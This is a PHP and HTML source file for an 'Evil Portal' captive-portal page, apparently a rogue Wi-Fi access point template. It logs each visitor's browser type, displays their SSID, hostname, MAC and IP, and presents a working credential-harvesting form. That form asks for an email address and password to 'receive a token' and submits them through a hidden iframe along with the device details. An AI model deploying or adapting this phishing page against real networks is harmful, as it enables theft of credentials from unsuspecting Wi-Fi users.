<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
function increment_browser($browser)
{
    try {
        $sqlite = new \SQLite3('/tmp/landingpage.db');
    } catch (Exception $e) {
        return false;
    }
    $sqlite->exec('CREATE TABLE IF NOT EXISTS user_agents  (browser TEXT NOT NULL);');
    $statement = $sqlite->prepare('INSERT INTO user_agents (browser) VALUES(:browser);');
    $statement->bindValue(':browser', $browser, SQLITE3_TEXT);
    try {
        $ret = $statement->execute();
    } catch (Exception $e) {
        return false;
    }
    return $ret;
}
function identifyUserAgent($userAgent)
{
    if (preg_match('/(MSIE|Trident|(?!Gecko.+)Firefox)/', $userAgent)) {
        increment_browser('firefox');
    }else if (preg_match('/(?!AppleWebKit.+Chrome.+)Safari(?!.+Edge)/', $userAgent)) {
        increment_browser('safari');
    }else if (preg_match('/(?!AppleWebKit.+)Chrome(?!.+Edge)/', $userAgent)) {
        increment_browser('chrome');
    }else if (preg_match('/(?!AppleWebKit.+Chrome.+Safari.+)Edge/', $userAgent)) {
        increment_browser('edge');
    }else if (preg_match('/MSIE [0-9]\./', $userAgent)) {
        increment_browser('internet_explorer');
    } elseif (preg_match('/^Opera\/[0-9]{1,3}\.[0-9]/', $userAgent)) {
        increment_browser('opera');
    } else {
        increment_browser('other');
    }  
}
identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
?>
<HTML>
    <HEAD>
        <title>Evil Portal</title>
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="0" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </HEAD>
    <BODY>
        <div style="text-align: center;">
            <h1>Evil Portal</h1>
            <p>This is the default Evil Portal page.</p>
            <p>The SSID you are connected to is <?=getClientSSID($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your host name is <?=getClientHostName($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your MAC Address is <?=getClientMac($_SERVER['REMOTE_ADDR']);?></p>
            <p>Your internal IP address is <?=$_SERVER['REMOTE_ADDR'];?></p>
            <br>
            <p><b>Please enter your Email Address and Password to receive a Token</b></p>

            <form method="POST" action="/captiveportal/index.php" target="hiddenFrame">
            <input id='email-input' name="email" type="email" class='g-input' placeholder="E-Mail" autofocus="true" autocorrect="off" autocomplete="on" autocapitalize="off"  required>
            <br><br>
            <input id='pw-input' name='gpw' type="password" class='g-input' placeholder="Password" autofocus="true" autocorrect="off" autocomplete="on" autocapitalize="off"  required>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
	    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
	    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="gettoken" value="gettoken">
            <br><br>
            <button type="submit">Get Token</button>
            </form>
            
            <form method="POST" action="/captiveportal/index.php">
            <h1>Token</h1>
            <p>Enter Your Token</p>
            <p>Your Token has been send to your E-Mail<br>Enter the Token to continue </p>
            <input name='token' id='token-input' type="text" class='g-input' placeholder="TOKEN" autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off"  required>
	    <input type="hidden" name="getaccess" value="getaccess">
	    <input type="hidden" name="target" value="<?=$destination?>">
	    <br><br>
            <button type="submit">Authorize</button>
            </form>
		
        </div>
         <iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe> <!-- Hidden Target Frame -->
    </BODY>
</HTML>
